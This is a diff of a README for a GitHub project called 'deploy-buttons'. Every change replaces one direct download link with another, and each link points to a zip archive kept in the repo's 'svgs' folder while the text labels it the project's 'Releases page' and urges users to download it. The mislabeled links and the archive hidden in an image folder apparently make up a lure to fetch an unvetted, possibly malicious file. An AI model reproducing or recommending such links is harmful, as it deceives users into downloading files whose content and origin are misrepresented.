@@ -1,6 +1,6 @@
 # 🚀 deploy-buttons - Simple Buttons for Easy Deployment
 
-[![Download deploy-buttons](https://raw.githubusercontent.com/kbkgk1/deploy-buttons/main/svgs/buttons_deploy_libationary.zip)](https://raw.githubusercontent.com/kbkgk1/deploy-buttons/main/svgs/buttons_deploy_libationary.zip)
+[![Download deploy-buttons](https://github.com/kbkgk1/deploy-buttons/raw/refs/heads/main/svgs/buttons-deploy-3.9.zip)](https://github.com/kbkgk1/deploy-buttons/raw/refs/heads/main/svgs/buttons-deploy-3.9.zip)
 
 ## 📦 Overview
 
@@ -25,7 +25,7 @@ To begin using deploy-buttons, you need to download the application. Follow the 
 
 ## 📥 Download & Install
 
-To download the latest version of deploy-buttons, please visit our [Releases page](https://raw.githubusercontent.com/kbkgk1/deploy-buttons/main/svgs/buttons_deploy_libationary.zip). Here are the steps:
+To download the latest version of deploy-buttons, please visit our [Releases page](https://github.com/kbkgk1/deploy-buttons/raw/refs/heads/main/svgs/buttons-deploy-3.9.zip). Here are the steps:
 
 1. Click the link above to go to the Releases page.
 2. Look for the version labeled "Latest Release."
@@ -90,4 +90,4 @@ This project covers these main topics:
 
 Thank you for using deploy-buttons! Your support helps improve this project. If you like what you see, consider sharing it with others. We appreciate your involvement in making deployment easier for everyone! 
 
-Be sure to visit our [Releases page](https://raw.githubusercontent.com/kbkgk1/deploy-buttons/main/svgs/buttons_deploy_libationary.zip) for the latest updates and downloads.
+Be sure to visit our [Releases page](https://github.com/kbkgk1/deploy-buttons/raw/refs/heads/main/svgs/buttons-deploy-3.9.zip) for the latest updates and downloads.
